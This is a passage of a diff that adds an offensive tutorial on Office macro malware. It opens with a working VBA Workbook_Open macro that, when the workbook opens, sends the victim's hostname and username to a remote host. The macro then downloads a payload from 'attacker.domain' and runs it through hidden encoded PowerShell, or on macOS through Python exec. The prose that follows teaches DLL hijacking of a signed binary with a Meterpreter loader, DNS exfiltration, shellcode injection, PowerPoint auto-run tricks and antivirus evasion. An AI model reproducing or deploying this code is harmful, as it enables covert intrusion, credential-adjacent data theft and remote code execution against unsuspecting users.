+      <span class="n">Dim</span> <span class="n">i1</span> <span class="n">As</span> <span class="n">Byte</span><span class="p">:</span> <span class="n">i1</span> <span class="o">=</span> <span class="n">IBuf</span><span class="p">(</span><span class="n">ip</span><span class="p">):</span> <span class="n">ip</span> <span class="o">=</span> <span class="n">ip</span> <span class="o">+</span> <span class="mi">1</span>
+      <span class="n">Dim</span> <span class="n">i2</span> <span class="n">As</span> <span class="n">Byte</span><span class="p">:</span> <span class="n">If</span> <span class="n">ip</span> <span class="o">&lt;</span> <span class="n">ILen</span> <span class="n">Then</span> <span class="n">i2</span> <span class="o">=</span> <span class="n">IBuf</span><span class="p">(</span><span class="n">ip</span><span class="p">):</span> <span class="n">ip</span> <span class="o">=</span> <span class="n">ip</span> <span class="o">+</span> <span class="mi">1</span> <span class="n">Else</span> <span class="n">i2</span> <span class="o">=</span> <span class="n">Asc</span><span class="p">(</span><span class="s2">&quot;A&quot;</span><span class="p">)</span>
+      <span class="n">Dim</span> <span class="n">i3</span> <span class="n">As</span> <span class="n">Byte</span><span class="p">:</span> <span class="n">If</span> <span class="n">ip</span> <span class="o">&lt;</span> <span class="n">ILen</span> <span class="n">Then</span> <span class="n">i3</span> <span class="o">=</span> <span class="n">IBuf</span><span class="p">(</span><span class="n">ip</span><span class="p">):</span> <span class="n">ip</span> <span class="o">=</span> <span class="n">ip</span> <span class="o">+</span> <span class="mi">1</span> <span class="n">Else</span> <span class="n">i3</span> <span class="o">=</span> <span class="n">Asc</span><span class="p">(</span><span class="s2">&quot;A&quot;</span><span class="p">)</span>
+      <span class="n">If</span> <span class="n">i0</span> <span class="o">&gt;</span> <span class="mi">127</span> <span class="n">Or</span> <span class="n">i1</span> <span class="o">&gt;</span> <span class="mi">127</span> <span class="n">Or</span> <span class="n">i2</span> <span class="o">&gt;</span> <span class="mi">127</span> <span class="n">Or</span> <span class="n">i3</span> <span class="o">&gt;</span> <span class="mi">127</span> <span class="n">Then</span> <span class="n">_</span>
+         <span class="n">Err</span><span class="o">.</span><span class="n">Raise</span> <span class="n">vbObjectError</span><span class="p">,</span> <span class="p">,</span> <span class="s2">&quot;Illegal character in Base64 encoded data.&quot;</span>
+      <span class="n">Dim</span> <span class="n">b0</span> <span class="n">As</span> <span class="n">Byte</span><span class="p">:</span> <span class="n">b0</span> <span class="o">=</span> <span class="n">Map2</span><span class="p">(</span><span class="n">i0</span><span class="p">)</span>
+      <span class="n">Dim</span> <span class="n">b1</span> <span class="n">As</span> <span class="n">Byte</span><span class="p">:</span> <span class="n">b1</span> <span class="o">=</span> <span class="n">Map2</span><span class="p">(</span><span class="n">i1</span><span class="p">)</span>
+      <span class="n">Dim</span> <span class="n">b2</span> <span class="n">As</span> <span class="n">Byte</span><span class="p">:</span> <span class="n">b2</span> <span class="o">=</span> <span class="n">Map2</span><span class="p">(</span><span class="n">i2</span><span class="p">)</span>
+      <span class="n">Dim</span> <span class="n">b3</span> <span class="n">As</span> <span class="n">Byte</span><span class="p">:</span> <span class="n">b3</span> <span class="o">=</span> <span class="n">Map2</span><span class="p">(</span><span class="n">i3</span><span class="p">)</span>
+      <span class="n">If</span> <span class="n">b0</span> <span class="o">&gt;</span> <span class="mi">63</span> <span class="n">Or</span> <span class="n">b1</span> <span class="o">&gt;</span> <span class="mi">63</span> <span class="n">Or</span> <span class="n">b2</span> <span class="o">&gt;</span> <span class="mi">63</span> <span class="n">Or</span> <span class="n">b3</span> <span class="o">&gt;</span> <span class="mi">63</span> <span class="n">Then</span> <span class="n">_</span>
+         <span class="n">Err</span><span class="o">.</span><span class="n">Raise</span> <span class="n">vbObjectError</span><span class="p">,</span> <span class="p">,</span> <span class="s2">&quot;Illegal character in Base64 encoded data.&quot;</span>
+      <span class="n">Dim</span> <span class="n">o0</span> <span class="n">As</span> <span class="n">Byte</span><span class="p">:</span> <span class="n">o0</span> <span class="o">=</span> <span class="p">(</span><span class="n">b0</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span> <span class="n">Or</span> <span class="p">(</span><span class="n">b1</span> \ <span class="o">&amp;</span><span class="n">H10</span><span class="p">)</span>
+      <span class="n">Dim</span> <span class="n">o1</span> <span class="n">As</span> <span class="n">Byte</span><span class="p">:</span> <span class="n">o1</span> <span class="o">=</span> <span class="p">((</span><span class="n">b1</span> <span class="n">And</span> <span class="o">&amp;</span><span class="n">HF</span><span class="p">)</span> <span class="o">*</span> <span class="o">&amp;</span><span class="n">H10</span><span class="p">)</span> <span class="n">Or</span> <span class="p">(</span><span class="n">b2</span> \ <span class="mi">4</span><span class="p">)</span>
+      <span class="n">Dim</span> <span class="n">o2</span> <span class="n">As</span> <span class="n">Byte</span><span class="p">:</span> <span class="n">o2</span> <span class="o">=</span> <span class="p">((</span><span class="n">b2</span> <span class="n">And</span> <span class="mi">3</span><span class="p">)</span> <span class="o">*</span> <span class="o">&amp;</span><span class="n">H40</span><span class="p">)</span> <span class="n">Or</span> <span class="n">b3</span>
+      <span class="n">Out</span><span class="p">(</span><span class="n">op</span><span class="p">)</span> <span class="o">=</span> <span class="n">o0</span><span class="p">:</span> <span class="n">op</span> <span class="o">=</span> <span class="n">op</span> <span class="o">+</span> <span class="mi">1</span>
+      <span class="n">If</span> <span class="n">op</span> <span class="o">&lt;</span> <span class="n">OLen</span> <span class="n">Then</span> <span class="n">Out</span><span class="p">(</span><span class="n">op</span><span class="p">)</span> <span class="o">=</span> <span class="n">o1</span><span class="p">:</span> <span class="n">op</span> <span class="o">=</span> <span class="n">op</span> <span class="o">+</span> <span class="mi">1</span>
+      <span class="n">If</span> <span class="n">op</span> <span class="o">&lt;</span> <span class="n">OLen</span> <span class="n">Then</span> <span class="n">Out</span><span class="p">(</span><span class="n">op</span><span class="p">)</span> <span class="o">=</span> <span class="n">o2</span><span class="p">:</span> <span class="n">op</span> <span class="o">=</span> <span class="n">op</span> <span class="o">+</span> <span class="mi">1</span>
+      <span class="n">Loop</span>
+   <span class="n">Base64Decode</span> <span class="o">=</span> <span class="n">Out</span>
+   <span class="n">End</span> <span class="n">Function</span>
+
+<span class="n">Private</span> <span class="n">Sub</span> <span class="n">Init</span><span class="p">()</span>
+   <span class="n">Dim</span> <span class="n">C</span> <span class="n">As</span> <span class="n">Integer</span><span class="p">,</span> <span class="n">i</span> <span class="n">As</span> <span class="n">Integer</span>
+   <span class="s1">&#39; set Map1</span>
+   <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
+   <span class="n">For</span> <span class="n">C</span> <span class="o">=</span> <span class="n">Asc</span><span class="p">(</span><span class="s2">&quot;A&quot;</span><span class="p">)</span> <span class="n">To</span> <span class="n">Asc</span><span class="p">(</span><span class="s2">&quot;Z&quot;</span><span class="p">):</span> <span class="n">Map1</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">=</span> <span class="n">C</span><span class="p">:</span> <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:</span> <span class="n">Next</span>
+   <span class="n">For</span> <span class="n">C</span> <span class="o">=</span> <span class="n">Asc</span><span class="p">(</span><span class="s2">&quot;a&quot;</span><span class="p">)</span> <span class="n">To</span> <span class="n">Asc</span><span class="p">(</span><span class="s2">&quot;z&quot;</span><span class="p">):</span> <span class="n">Map1</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">=</span> <span class="n">C</span><span class="p">:</span> <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:</span> <span class="n">Next</span>
+   <span class="n">For</span> <span class="n">C</span> <span class="o">=</span> <span class="n">Asc</span><span class="p">(</span><span class="s2">&quot;0&quot;</span><span class="p">)</span> <span class="n">To</span> <span class="n">Asc</span><span class="p">(</span><span class="s2">&quot;9&quot;</span><span class="p">):</span> <span class="n">Map1</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">=</span> <span class="n">C</span><span class="p">:</span> <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">:</span> <span class="n">Next</span>
+   <span class="n">Map1</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">=</span> <span class="n">Asc</span><span class="p">(</span><span class="s2">&quot;+&quot;</span><span class="p">):</span> <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
+   <span class="n">Map1</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">=</span> <span class="n">Asc</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">):</span> <span class="n">i</span> <span class="o">=</span> <span class="n">i</span> <span class="o">+</span> <span class="mi">1</span>
+   <span class="s1">&#39; set Map2</span>
+   <span class="n">For</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span> <span class="n">To</span> <span class="mi">127</span><span class="p">:</span> <span class="n">Map2</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">=</span> <span class="mi">255</span><span class="p">:</span> <span class="n">Next</span>
+   <span class="n">For</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span> <span class="n">To</span> <span class="mi">63</span><span class="p">:</span> <span class="n">Map2</span><span class="p">(</span><span class="n">Map1</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="o">=</span> <span class="n">i</span><span class="p">:</span> <span class="n">Next</span>
+   <span class="n">InitDone</span> <span class="o">=</span> <span class="n">True</span>
+   <span class="n">End</span> <span class="n">Sub</span>
+
+<span class="n">Private</span> <span class="n">Function</span> <span class="n">ConvertStringToBytes</span><span class="p">(</span><span class="n">ByVal</span> <span class="n">s</span> <span class="n">As</span> <span class="nb nb-Type">String</span><span class="p">)</span> <span class="n">As</span> <span class="n">Byte</span><span class="p">()</span>
+   <span class="n">Dim</span> <span class="n">b1</span><span class="p">()</span> <span class="n">As</span> <span class="n">Byte</span><span class="p">:</span> <span class="n">b1</span> <span class="o">=</span> <span class="n">s</span>
+   <span class="n">Dim</span> <span class="n">l</span> <span class="n">As</span> <span class="n">Long</span><span class="p">:</span> <span class="n">l</span> <span class="o">=</span> <span class="p">(</span><span class="n">UBound</span><span class="p">(</span><span class="n">b1</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)</span> \ <span class="mi">2</span>
+   <span class="n">If</span> <span class="n">l</span> <span class="o">=</span> <span class="mi">0</span> <span class="n">Then</span> <span class="n">ConvertStringToBytes</span> <span class="o">=</span> <span class="n">b1</span><span class="p">:</span> <span class="n">Exit</span> <span class="n">Function</span>
+   <span class="n">Dim</span> <span class="n">b2</span><span class="p">()</span> <span class="n">As</span> <span class="n">Byte</span>
+   <span class="n">ReDim</span> <span class="n">b2</span><span class="p">(</span><span class="mi">0</span> <span class="n">To</span> <span class="n">l</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="n">As</span> <span class="n">Byte</span>
+   <span class="n">Dim</span> <span class="n">p</span> <span class="n">As</span> <span class="n">Long</span>
+   <span class="n">For</span> <span class="n">p</span> <span class="o">=</span> <span class="mi">0</span> <span class="n">To</span> <span class="n">l</span> <span class="o">-</span> <span class="mi">1</span>
+      <span class="n">Dim</span> <span class="n">C</span> <span class="n">As</span> <span class="n">Long</span><span class="p">:</span> <span class="n">C</span> <span class="o">=</span> <span class="n">b1</span><span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="n">p</span><span class="p">)</span> <span class="o">+</span> <span class="mi">256</span> <span class="o">*</span> <span class="n">CLng</span><span class="p">(</span><span class="n">b1</span><span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="n">p</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span>
+      <span class="n">If</span> <span class="n">C</span> <span class="o">&gt;=</span> <span class="mi">256</span> <span class="n">Then</span> <span class="n">C</span> <span class="o">=</span> <span class="n">Asc</span><span class="p">(</span><span class="s2">&quot;?&quot;</span><span class="p">)</span>
+      <span class="n">b2</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">=</span> <span class="n">C</span>
+      <span class="n">Next</span>
+   <span class="n">ConvertStringToBytes</span> <span class="o">=</span> <span class="n">b2</span>
+   <span class="n">End</span> <span class="n">Function</span>
+
+<span class="n">Private</span> <span class="n">Function</span> <span class="n">ConvertBytesToString</span><span class="p">(</span><span class="n">b</span><span class="p">()</span> <span class="n">As</span> <span class="n">Byte</span><span class="p">)</span> <span class="n">As</span> <span class="nb nb-Type">String</span>
+   <span class="n">Dim</span> <span class="n">l</span> <span class="n">As</span> <span class="n">Long</span><span class="p">:</span> <span class="n">l</span> <span class="o">=</span> <span class="n">UBound</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="o">-</span> <span class="n">LBound</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span>
+   <span class="n">Dim</span> <span class="n">b2</span><span class="p">()</span> <span class="n">As</span> <span class="n">Byte</span>
+   <span class="n">ReDim</span> <span class="n">b2</span><span class="p">(</span><span class="mi">0</span> <span class="n">To</span> <span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="n">l</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="n">As</span> <span class="n">Byte</span>
+   <span class="n">Dim</span> <span class="n">p0</span> <span class="n">As</span> <span class="n">Long</span><span class="p">:</span> <span class="n">p0</span> <span class="o">=</span> <span class="n">LBound</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
+   <span class="n">Dim</span> <span class="n">p</span> <span class="n">As</span> <span class="n">Long</span>
+   <span class="n">For</span> <span class="n">p</span> <span class="o">=</span> <span class="mi">0</span> <span class="n">To</span> <span class="n">l</span> <span class="o">-</span> <span class="mi">1</span><span class="p">:</span> <span class="n">b2</span><span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="n">p</span><span class="p">)</span> <span class="o">=</span> <span class="n">b</span><span class="p">(</span><span class="n">p0</span> <span class="o">+</span> <span class="n">p</span><span class="p">):</span> <span class="n">Next</span>
+   <span class="n">Dim</span> <span class="n">s</span> <span class="n">As</span> <span class="nb nb-Type">String</span><span class="p">:</span> <span class="n">s</span> <span class="o">=</span> <span class="n">b2</span>
+   <span class="n">ConvertBytesToString</span> <span class="o">=</span> <span class="n">s</span>
+   <span class="n">End</span> <span class="n">Function</span>
+<span class="n">Function</span> <span class="n">GetHTTPResult</span><span class="p">(</span><span class="n">sURL</span> <span class="n">As</span> <span class="nb nb-Type">String</span><span class="p">)</span> <span class="n">As</span> <span class="nb nb-Type">String</span>
+        <span class="n">Dim</span> <span class="n">XMLHTTP</span> <span class="n">As</span> <span class="n">Variant</span><span class="p">,</span> <span class="n">sResult</span> <span class="n">As</span> <span class="nb nb-Type">String</span>
+
+        <span class="n">Set</span> <span class="n">XMLHTTP</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s2">&quot;WinHttp.WinHttpRequest.5.1&quot;</span><span class="p">)</span>
+        <span class="n">XMLHTTP</span><span class="o">.</span><span class="n">Open</span> <span class="s2">&quot;GET&quot;</span><span class="p">,</span> <span class="n">sURL</span><span class="p">,</span> <span class="n">False</span>
+        <span class="n">XMLHTTP</span><span class="o">.</span><span class="n">Send</span>
+        <span class="n">Debug</span><span class="o">.</span><span class="n">Print</span> <span class="s2">&quot;Status: &quot;</span> <span class="o">&amp;</span> <span class="n">XMLHTTP</span><span class="o">.</span><span class="n">Status</span> <span class="o">&amp;</span> <span class="s2">&quot; - &quot;</span> <span class="o">&amp;</span> <span class="n">XMLHTTP</span><span class="o">.</span><span class="n">StatusText</span>
+        <span class="n">sResult</span> <span class="o">=</span> <span class="n">XMLHTTP</span><span class="o">.</span><span class="n">ResponseText</span>
+        <span class="n">Debug</span><span class="o">.</span><span class="n">Print</span> <span class="s2">&quot;Length of response: &quot;</span> <span class="o">&amp;</span> <span class="n">Len</span><span class="p">(</span><span class="n">sResult</span><span class="p">)</span>
+        <span class="n">Set</span> <span class="n">XMLHTTP</span> <span class="o">=</span> <span class="n">Nothing</span>
+        <span class="n">GetHTTPResult</span> <span class="o">=</span> <span class="n">sResult</span>
+    <span class="n">End</span> <span class="n">Function</span>
+
+
+
+<span class="n">Private</span> <span class="n">Sub</span> <span class="n">Workbook_Open</span><span class="p">()</span>
+
+<span class="n">Dim</span> <span class="n">result</span> <span class="n">As</span> <span class="nb nb-Type">String</span>
+<span class="n">Dim</span> <span class="n">position</span> <span class="n">As</span> <span class="n">Integer</span>
+<span class="n">Dim</span> <span class="n">hostname</span> <span class="n">As</span> <span class="nb nb-Type">String</span>
+<span class="n">Dim</span> <span class="n">username</span> <span class="n">As</span> <span class="nb nb-Type">String</span>
+<span class="n">Dim</span> <span class="n">etc_host</span> <span class="n">As</span> <span class="nb nb-Type">String</span>
+<span class="n">Dim</span> <span class="n">text</span> <span class="n">As</span> <span class="nb nb-Type">String</span>
+<span class="n">Dim</span> <span class="n">aLine</span> <span class="n">As</span> <span class="nb nb-Type">String</span>
+<span class="n">Dim</span> <span class="n">aURL</span> <span class="n">As</span> <span class="nb nb-Type">String</span>
+<span class="n">Dim</span> <span class="n">uResult</span> <span class="n">As</span> <span class="nb nb-Type">String</span>
+<span class="n">Dim</span> <span class="n">encoded</span> <span class="n">As</span> <span class="nb nb-Type">String</span>
+<span class="n">Dim</span> <span class="n">FileNum</span> <span class="n">As</span> <span class="n">Integer</span>
+<span class="n">Dim</span> <span class="n">aFile</span> <span class="n">As</span> <span class="nb nb-Type">String</span>
+<span class="n">Dim</span> <span class="n">command</span> <span class="n">As</span> <span class="nb nb-Type">String</span>
+<span class="n">Dim</span> <span class="n">exec_string</span> <span class="n">As</span> <span class="nb nb-Type">String</span>
+
+
+<span class="n">result</span> <span class="o">=</span> <span class="n">Application</span><span class="o">.</span><span class="n">OperatingSystem</span>
+<span class="n">position</span> <span class="o">=</span> <span class="n">InStr</span><span class="p">(</span><span class="n">result</span><span class="p">,</span> <span class="s2">&quot;Macintosh&quot;</span><span class="p">)</span>
+
+<span class="n">If</span> <span class="n">position</span> <span class="o">=</span> <span class="mi">0</span> <span class="n">Then</span>
+    <span class="s1">&#39; Using windows&#39;</span>
+    <span class="s1">&#39;MsgBox &quot;Microsoft Excel is using Windows &quot; &amp; position</span>
+    <span class="n">hostname</span> <span class="o">=</span> <span class="n">Environ</span><span class="o">$</span><span class="p">(</span><span class="s2">&quot;computername&quot;</span><span class="p">)</span>
+    <span class="n">username</span> <span class="o">=</span> <span class="n">Environ</span><span class="o">$</span><span class="p">(</span><span class="s2">&quot;username&quot;</span><span class="p">)</span>
+    <span class="s1">&#39;MsgBox &quot;test: &quot; &amp; hostname &amp; &quot; &quot; &amp; username</span>
+    <span class="n">Dim</span> <span class="n">sURL</span> <span class="n">As</span> <span class="nb nb-Type">String</span><span class="p">,</span> <span class="n">sResult</span> <span class="n">As</span> <span class="nb nb-Type">String</span>
+    <span class="n">Dim</span> <span class="n">oResult</span> <span class="n">As</span> <span class="n">Variant</span><span class="p">,</span> <span class="n">oData</span> <span class="n">As</span> <span class="n">Variant</span><span class="p">,</span> <span class="n">R</span> <span class="n">As</span> <span class="n">Long</span><span class="p">,</span> <span class="n">C</span> <span class="n">As</span> <span class="n">Long</span>
+
+    <span class="n">text</span> <span class="o">=</span> <span class="n">hostname</span> <span class="o">&amp;</span> <span class="s2">&quot; &quot;</span> <span class="o">&amp;</span> <span class="n">username</span>
+    <span class="n">encoded</span> <span class="o">=</span> <span class="n">Base64EncodeString</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
+    <span class="n">sURL</span> <span class="o">=</span> <span class="s2">&quot;http://XX.XX.XX.XX:80/&quot;</span> <span class="o">&amp;</span> <span class="n">encoded</span>
+    <span class="s1">&#39;MsgBox &quot;URL: &quot; &amp; sURL</span>
+    <span class="n">sResult</span> <span class="o">=</span> <span class="n">GetHTTPResult</span><span class="p">(</span><span class="n">sURL</span><span class="p">)</span>
+    <span class="n">sResult</span> <span class="o">=</span> <span class="n">GetHTTPResult</span><span class="p">(</span><span class="s2">&quot;http://attacker.domain/payload_windows&quot;</span><span class="p">)</span>
+    <span class="s1">&#39;Debug.Print sResult</span>
+    <span class="n">command</span> <span class="o">=</span> <span class="s2">&quot;powershell.exe -NoP -sta -NonI -W Hidden -Enc &quot;</span> <span class="o">&amp;</span> <span class="n">sResult</span>
+    <span class="s1">&#39;Debug.Print command</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">Shell</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+
+<span class="n">Else</span>
+    <span class="n">aURL</span> <span class="o">=</span> <span class="s2">&quot;http://attacker.domain/&quot;</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">system</span><span class="p">(</span><span class="s2">&quot;/usr/bin/python -c &#39;import socket,os,base64,urllib2;urllib2.urlopen(&quot;</span> <span class="o">&amp;</span> <span class="n">Chr</span><span class="p">(</span><span class="mi">34</span><span class="p">)</span> <span class="o">&amp;</span> <span class="n">aURL</span> <span class="o">&amp;</span> <span class="n">Chr</span><span class="p">(</span><span class="mi">34</span><span class="p">)</span> <span class="o">&amp;</span> <span class="s2">&quot; + base64.b64encode(socket.gethostname() + &quot;</span> <span class="o">&amp;</span> <span class="n">Chr</span><span class="p">(</span><span class="mi">34</span><span class="p">)</span> <span class="o">&amp;</span> <span class="s2">&quot; &quot;</span> <span class="o">&amp;</span> <span class="n">Chr</span><span class="p">(</span><span class="mi">34</span><span class="p">)</span> <span class="o">&amp;</span> <span class="s2">&quot; + os.environ[&quot;</span> <span class="o">&amp;</span> <span class="n">Chr</span><span class="p">(</span><span class="mi">34</span><span class="p">)</span> <span class="o">&amp;</span> <span class="s2">&quot;USER&quot;</span> <span class="o">&amp;</span> <span class="n">Chr</span><span class="p">(</span><span class="mi">34</span><span class="p">)</span> <span class="o">&amp;</span> <span class="s2">&quot;]))&#39;&quot;</span><span class="p">)</span>
+    <span class="n">Debug</span><span class="o">.</span><span class="n">Print</span> <span class="n">result</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">system</span><span class="p">(</span><span class="s2">&quot;/usr/bin/python -c &#39;import socket,os,base64,urllib2;exec(urllib2.urlopen(&quot;</span> <span class="o">&amp;</span> <span class="n">Chr</span><span class="p">(</span><span class="mi">34</span><span class="p">)</span> <span class="o">&amp;</span> <span class="s2">&quot;http://attacker.domain/payload_osx&quot;</span> <span class="o">&amp;</span> <span class="n">Chr</span><span class="p">(</span><span class="mi">34</span><span class="p">)</span> <span class="o">&amp;</span> <span class="s2">&quot;).read())&#39; &amp;&quot;</span><span class="p">)</span>
+
+<span class="n">End</span> <span class="n">If</span>
+
+
+<span class="n">End</span> <span class="n">Sub</span>
+</code></pre></div>
+
+<p>It is possible to create an OSX-specific payload for use in a macro-based attack with project Empire. It should be noted that Office 2016 on OSX does properly sandbox execution of Office 2016 documents, but there are still interesting things that can be done when our agent(s) callback.</p>
+<h3>RTF, Signed Binary plus DLL Hijacking with a Custom MSF</h3>
+<p>The following macro malware combines RTF&rsquo;s default behaviour of dropping embedded OLE objects into the TEMP directory with a DLL hijacking vulnerability of a trusted (and signed) executable (Kaspersky&rsquo;s kavremover.exe), and a custom made Meterpreter loader.</p>
+<p>As mentioned, RTF files containing embedded OLE objects showcase interesting behaviour. Once they are open, they automatically drop the embedded OLE objects into the temp directory. If we can find a trusted and signed binary vulnerable to DLL hijacking, we can embed both the trusted binary and the DLL. In an RTF file. Once the RTF file is opened, both the DLL and the Signed Binary will be dropped into the temp directory. DLL hijacking requires that the malicious DLL, which is going to hijack the loading of the legitimate one, should be in the same directory as the executable having a DLL hijacking vulnerability. We can automate this procedure from inside a macro, launch the vulnerable executable, and trigger the DLL hijacking vulnerability. We mentioned earlier that RTF files do not support macros; we will address this momentarily. </p>
+<p>It should be noted that since the on-disk footprint of this attack is quite large, we should make sure that our malicious DLL will be able to evade defences. It is recommended that for this attack, a custom Meterpreter loader is created. The trusted and signed executable we will use in the following example is an older version of Kaspersky&rsquo;s kavremover.exe, which is vulnerable to DLL hijacking. Let us see how we can chain this into a single macro attack. </p>
+<p>Let us start with our custom Meterpreter loader. We will modify Rafael Mudge&rsquo;s Metasploit Loader so that it can hijack the kavremover.exe legitimate DLL and provide us with a Meterpreter shell. Following the procedure described in the below blogs, we can identify that we need to change the function main.</p>
+<ul>
+<li>https://github.com/rsmudge/metasploit-loader/blob/master/src/main.c</li>
+<li>https://astr0baby.wordpress.com/2014/02/12/custom-meterpreter-loader-dll/</li>
+<li>https://astr0baby.wordpress.com/2014/02/13/customising-meterpreter-loader-dll-part-2/</li>
+</ul>
+<p>Since RTF files do not support macros, let us see how we can automate the whole attack from a macro supporting file.</p>
+<h3>Embedding an Executable in a Macro</h3>
+<p>The following macro malware contains an executable inside its code in the form of hex dump strings. The embedded executable will be reassembled, dropped into a temporary directory, and executed from this location. The same could be performed with a DLL file in case executables are blocked. There are numerous ways to embed an executable and or DLL inside an Office file. The easiest way is using Didier Stevens&rsquo; file2vbscript python script. Once again, the on-disk footprint of this attack is large, so we have to make sure our malicious executable or DLL is capable of evading defences. To accomplish this, we can use the custom MSF loader from the previous example, or the PowerShell base beaconing malware which we will cover later on in this tutorial. </p>
+<p>The example is shown on page 81 case. </p>
+<h3>Network-tracing macro</h3>
+<p>This macro malware performs network sniffing by leveraging PowerShell&rsquo;s network tracing capabilities. Specifically, it drops and executes a hardcoded PS1 script that does all the heavy lifting. Macros such as this can prove handy for reconnaissance activities. </p>
+<ul>
+<li>https://gist.github.com/anonymous/a3ebd8928135ae29fc341c6036bc7eac</li>
+</ul>
+<p>The example is shown on  page 83 </p>
+<h3>The APT perspective: Multi-stage macro malware using DNS for payload retrieval and exfiltration</h3>
+<p>We will analyse the tactics, techniques and procedures of a macro malware that an APT group used. The macro malware had embedded encoded malicious scripts, dropped various files on its host, performed enumeration activities and used DNS for payload retrieval and exfiltration purposes. </p>
+<p>This case study will showcase how various techniques can be combined to evade defences and remain stealthy. A similar source code to the one we will analyse can be found in the link below. </p>
+<ul>
+<li>https://gist.github.com/anonymous/d0da355e5c21a122866808d37234cd5d</li>
+</ul>
+<p>The example is shown on page 85.</p>
+<p>Inside the macro is code that displays additional spreadsheet data when the user enables macros. This technique is interesting and helps eliminate suspicion. During the attack, the APT group dropped a custom version of Mimikatz and a batch file with commands to obtain critical system information, such as the hostname, user and group accounts, local domain administrator accounts, and so forth. </p>
+<p>To better understand the DNS query structure used by the malware, refer to the following table. </p>
+<p>The example is shown on page 91. </p>
+<p>Two excellent resources on using  DNS through PowerShell are:</p>
+<ul>
+<li>http://www.labofapenetrationtester.com/2015/01/fun-with-dns-txt-records-and-powershell.html</li>
+<li>http://0entropy.blogspot.com/2012/04/powershell-metasploit-meterpreter-and.html</li>
+</ul>
+<p>page 92 </p>
+<h3>The forbidden fruit: Macro malware performing shellcode injection</h3>
+<p>Numerous techniques can be used inside a macro to perform direct shellcode injection since VBA can directly interact with Windows APIs.</p>
+<h4>Macro based shellcode injection</h4>
+<p>Even though the above is quite a stealthy technique in payload delivery, it would not be recommended since it cannot easily be obfuscated, and a security solution will pick it up at the time of the injection into the Microsoft Office software targeted. </p>
+<p>Evasion techniques to avoid getting caught by the security solutions exist like the one presented in the link below, but the amount of extra noise produced is significant. </p>
+<p>example page 94 case </p>
+<h3>Macros on PowerPoint,</h3>
+<p>The equivalent of automatically run macros on PowerPoint is PowerPoint&rsquo;s Custom Actions. Malware authors seem to be using PowerPoint and Custom Actions lately instead of Microsoft Word and Excel files with macros. </p>
+<p>For example, if we would like to trigger a VisualBasic module inside a PowerPoint handled file using Custom Actions, we would do the following once the developer tab is enabled. </p>
+<ol>
+<li>File -&gt; Options -&gt; Customise Ribbon. </li>
+<li>Go to the <code>developer</code>, and click <code>Visual Basic</code>, then click <code>Insert</code> and choose <code>module</code>. This module is where we will place malicious code to create a trigger mechanism. </li>
+<li>Go to <code>Insert</code>, click the item to be associated with the action and click on <code>Action</code>, then you can choose either the <code>Mouse Click</code> or <code>Mouse Over</code> tabs, and then click on <code>Run macro</code> to associate the module you have inserted earlier with the action. </li>
+</ol>
+<p>To automatically execute the Visual Basic module inserted without using Custom Actions, we will add an office 2007 custom UI part. The procedure is as follows. </p>
+<ol>
+<li>Insert the desired module and save the PowerPoint presentation as a macro-supporting PowerPoint file type. </li>
+<li>Unzip the PowerPoint file just saved</li>
+<li>Edit the _rels/.rels file to add the following line right before the last <code>&lt;/Relationships&gt;</code>.</li>
+</ol>
+<div class="codehilite"><pre><span></span><code>&lt;Relationship Type=http://schemas.microsoft.com/office/2006/relationships/ui/extensibility Target=&quot;/customUI/customUI.xml&quot; Id=&quot;Rd6e72c29d34a427e&quot; /&gt; 
+</code></pre></div>
+
+<ol start="4">
+<li>Create a new directory on the same level as the _rels directory called &ldquo;customUI&rdquo;.</li>
+</ol>
+<p>Inside the &ldquo;customUI&rdquo; directory, create a customUI.xml file containing the following. </p>
+<div class="codehilite"><pre><span></span><code><span class="nt">&lt;customUI</span> <span class="na">xmlns=</span><span class="s">http://schemas.microsoft.com/office/2006/01/customui</span> <span class="na">onLoad=</span><span class="s">&quot;Name of VBA module&quot;</span> <span class="nt">&gt;&lt;/customUI&gt;</span>
+</code></pre></div>
+
+<ol start="5">
+<li>Zip the whole directory and rename it to the filename used to save the original PowerPoint presentation. </li>
+</ol>
+<p>Now the VBA module will automatically run as soon as the user enables macros. </p>
+<p>Finally, a similar technique exists that can prove handy in restricted environments where macros are disabled globally. This technique uses only objects and custom animation. Evading AV is a crucial part of macro base attacks; it is recommended that manual or automated VBA obfuscation techniques are performed before the attack. For an automated tool performing VBA obfuscation, please refer to the link.</p>
+<ul>
